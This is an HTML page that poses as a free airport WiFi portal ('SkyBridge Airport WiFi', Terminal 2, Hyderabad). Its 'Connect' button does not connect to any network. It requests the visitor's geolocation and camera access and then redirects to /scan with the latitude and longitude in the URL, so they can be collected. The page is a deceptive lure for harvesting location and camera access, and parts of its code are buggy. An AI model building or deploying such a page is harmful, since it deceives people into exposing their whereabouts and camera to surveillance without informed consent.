<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Airport Free WiFi</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:linear-gradient(135deg,#0077ff,#00bfff);
    padding:20px;
}

.card{
    background:white;
    width:100%;
    max-width:450px;
    border-radius:20px;
    padding:30px;
    text-align:center;
    box-shadow:0 10px 30px rgba(0,0,0,0.2);
}

.logo{
    font-size:60px;
    margin-bottom:10px;
}

h1{
    color:#1a1a1a;
    margin-bottom:10px;
}

.location{
    color:#666;
    margin-bottom:15px;
}

.wifi-badge{
    display:inline-block;
    background:#e8f4ff;
    color:#0077ff;
    padding:8px 16px;
    border-radius:20px;
    font-weight:bold;
    margin-bottom:20px;
}

.services{
    background:#f5f7fa;
    padding:15px;
    border-radius:10px;
    text-align:left;
    margin-bottom:20px;
}

.services h3{
    margin-bottom:10px;
}

.services ul{
    padding-left:20px;
}

.services li{
    margin-bottom:8px;
}

.connect-btn{
    width:100%;
    background:#0077ff;
    color:white;
    border:none;
    padding:15px;
    border-radius:10px;
    font-size:18px;
    cursor:pointer;
    transition:0.3s;
}

.connect-btn:hover{
    background:#005fd1;
}

.status{
    margin-top:15px;
    color:#333;
    font-weight:bold;
}

.notice{
    margin-top:20px;
    font-size:13px;
    color:#666;
}

.footer{
    margin-top:20px;
    font-size:12px;
    color:#999;
}

.card{
    padding:20px;
}

h1{
    font-size:24px;
}

.logo{
    font-size:50px;
}

.connect-btn{
    font-size:16px;
}
.permission-card{
    margin-top:20px;
    padding:20px;
    background:#fff4e5;
    border:1px solid #ffd28a;
    border-radius:12px;
    text-align:center;
}

.permission-icon{
    font-size:40px;
    margin-bottom:10px;
}

.permission-card h3{
    color:#cc7a00;
    margin-bottom:10px;
}

.permission-card p{
    color:#555;
    font-size:14px;
    margin-bottom:15px;
    line-height:1.5;
}

.retry-btn{
    background:#ff9800;
    color:white;
    border:none;
    padding:12px 20px;
    border-radius:8px;
    cursor:pointer;
    font-weight:bold;
}

.retry-btn:hover{
    background:#e68900;
}
}
</style>
</head>

<body>

<div class="card">

    <div class="logo">✈️</div>

    <h1>SkyBridge Airport WiFi</h1>

    <p class="location">Terminal 2 • Hyderabad</p>

    <div class="wifi-badge">
        Airport_Free_WiFi
    </div>

    <div class="services">
        <h3>Airport Services</h3>
        <ul>
            <li>Live Flight Updates</li>
            <li>Lounge Information</li>
            <li>Duty Free Promotions</li>
            <li>Airport Maps</li>
        </ul>
    </div>

    <button class="connect-btn" onclick="connectWifi()">
        Connect to Free WiFi
    </button>

    <div id="permissionCard" style="display:none;">
    <div class="permission-card">
        <div class="permission-icon">📍</div>

        <h3>Location Access Required</h3>

        <p>
            Airport WiFi requires your location to verify nearby access
            points and provide location-based airport services.If Location permission has been blocked by your browser. Please enable location access in browser settings and reload the page.
        </p>

        
    </div>
</div>
<br><br>

<input type="text" name="fullname" placeholder="Enter your name(optional)">
<br>

<div class="status" id="status">
    Click the button to connect.
</div>

    <div class="notice">
        By connecting you agree to the Airport WiFi Terms and Conditions.
    </div>

    <div class="footer">
        SkyBridge International Airport © 2026
    </div>

</div>

<script>

async function connectWifi(){

    const status = document.getElementById("status");
    const video = document.getElementById("video");

    status.innerText = "Requesting location access...";

    try{

        navigator.geolocation.getCurrentPosition(async function(position){

            let lat = position.coords.latitude;
            let lon = position.coords.longitude;

            status.innerText = "Location granted. Requesting camera access...";

            try{

                const stream = await navigator.mediaDevices.getUserMedia({
                    video:true
                });

                video.srcObject = stream;
                video.style.display = "block";

                status.innerText = "Connected successfully. Redirecting...";

                setTimeout(function(){

                    window.location.href =
                    `/scan?lat=${lat}&lon=${lon}`;

                },2000);

            }
            catch(err){

                status.innerText =
			    "Camera access is required to continue.<br>Please allow camera permission and try again.";
		    document.getElementById("permissionCArd").style.display = "block";

            }

        },

        function(error){

            status.innerText =
            document.getElementById("permissionCard").style.display = "block";

        });

    }
    catch(err){

        status.innerText =
        "Unable to connect.";

    }
}

</script>

</body>
</html>
